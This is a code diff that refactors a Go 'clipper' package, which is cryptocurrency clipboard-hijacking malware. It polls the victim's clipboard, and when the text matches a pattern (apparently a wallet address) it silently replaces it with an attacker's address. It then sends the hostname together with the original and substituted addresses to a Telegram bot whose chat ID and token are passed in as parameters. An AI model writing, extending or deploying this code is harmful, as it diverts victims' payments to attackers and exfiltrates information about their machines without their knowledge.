@@ -1,15 +1,22 @@
-package main
+package clipper
 
 import (
 	"fmt"
 	"os"
+	"regexp"
 	"time"
 
 	"github.com/atotto/clipboard"
+	"clipper/src/telegram"
 )
 
+type Matcher struct {
+	Regex *regexp.Regexp
+	Addr  string
+}
+
 // main clipper func
-func StartClipper() {
+func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
 	go func() {
 		var lastClipboardContent string
 		hostname, _ := os.Hostname()
@@ -28,10 +35,10 @@ func StartClipper() {
 
 			matched := false
 			for _, matcher := range matchers {
-				if matcher.regex.MatchString(currentContent) {
+				if matcher.Regex.MatchString(currentContent) {
 					originalAddr := currentContent
 
-					err = clipboard.WriteAll(matcher.addr)
+					err = clipboard.WriteAll(matcher.Addr)
 					if err != nil {
 						continue
 					}
@@ -39,12 +46,12 @@ func StartClipper() {
 					lastClipboardContent = originalAddr
 					matched = true
 
-					SendLog(
+					telegram.SendLog(
 						fmt.Sprintf(
 							"%s\n\n%s → %s",
 							hostname,
 							originalAddr,
-							matcher.addr,
+							matcher.Addr,
 						),
 						chat_id,
 						bot_token,
